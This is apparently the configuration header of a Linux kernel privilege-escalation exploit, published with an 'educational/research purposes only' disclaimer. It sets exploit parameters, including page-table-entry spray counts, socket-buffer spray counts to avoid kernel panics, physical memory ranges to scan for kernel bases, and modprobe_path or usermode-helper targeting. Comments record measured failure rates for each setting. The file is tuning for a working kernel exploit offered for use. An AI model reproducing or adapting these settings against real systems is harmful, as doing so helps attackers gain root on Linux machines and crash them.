// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

// ==== kconfig values (DO NOT DEVIATE) ====

#define KMOD_PATH_LEN 256  // default

#define CONFIG_STATIC_USERMODEHELPER 0 // default
#define CONFIG_STATIC_USERMODEHELPER_PATH "/sbin/usermode-helper" // default. if 1: check for this instead of modprobe_path

// if CONFIG_PHYSICAL_ALIGN is not defined in kconfig, use the CONFIG_PHYSICAL_START value
// - rather too small than too big, but don't deviate from kernel config
#define CONFIG_PHYSICAL_ALIGN ((unsigned long long)0x200000)  // default

// ==== actual config values for the exploit (DEVIATE AT WILL) ====

#define CONFIG_REDIRECT_LOG 0  // redirect stdout and stderr to a logging file to prevent noise when over network
#define CONFIG_VERBOSE_ 0  // extra log verbosity, handy for debugging
#define CONFIG_LEET 0  // breaching le mainframe

// amount of physical memory to scan for kernel bases
// - rather too much than too less, since scanning is very quick
// - scanning cancels when exploit succeeds
// - make sure to account for mmio and stuff, considering laptops may utilize a lot of PCIe physical memory
//   - as a rule of thumb, use 4GiB mmio, because scanning is quick and can't hurt to scan a larger area
// - exploit may get stuck when kernel base is not found and phys mem is out of bounds, press ctrl-c (it is safe)
#define CONFIG_PHYS_MEM (0x800000000 + 0x100000000)  // default: 32GiB system ram + 4GiB PCIe mmio and stuff

// amount of PTE pages allocated (sprayed) when draining PCP order-0 freelist
// - increasing bulk amount increases time required to alloc all these PTEs
// - this should be atleast a little more than the PCP order-0 freelist entries
// - **bloated systems need more PTEs than stripped systems**
#define CONFIG_PTE_SPRAY_AMOUNT 16000  // default: high-ball for debian systems

// amount of skb's sprayed on top of corrupted packet
// - more is better, until it isn't
// - not enough skb's lead to kernel panic when kernel encounters corrupted packet in freelist when allocating skb's
//#define CONFIG_SKB_SPRAY_AMOUNT 1 (12/32 fails)
//#define CONFIG_SKB_SPRAY_AMOUNT 64 (4/32 fails)
#define CONFIG_SKB_SPRAY_AMOUNT 170 // (0/651 fails)

// only lower when flexing on people
// - this wait period allows the kernel to make allocations in the background which aren't critical
// - this is useful since we do a lot of init allocations, and wait N seconds before continuing
// - for some reason the success rate is higher without this lol, I guess you could leave it at 0
//#define CONFIG_SEC_BEFORE_STORM 10 // (70/1000 fails)
#define CONFIG_SEC_BEFORE_STORM 0 // (6/1000 fails)